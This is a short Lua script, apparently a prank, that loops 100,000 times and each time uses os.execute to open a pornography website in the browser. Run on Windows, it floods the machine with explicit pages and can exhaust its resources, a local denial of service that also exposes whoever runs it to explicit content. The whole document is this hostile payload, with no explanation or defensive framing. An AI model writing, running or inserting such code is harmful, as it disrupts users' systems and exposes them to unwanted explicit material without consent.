local WebSiteLink = ("https://pornhub.com")
for i =1,100000 do
	coroutine.wrap(function() 
		os.execute("start "..WebSiteLink)
	end)()
end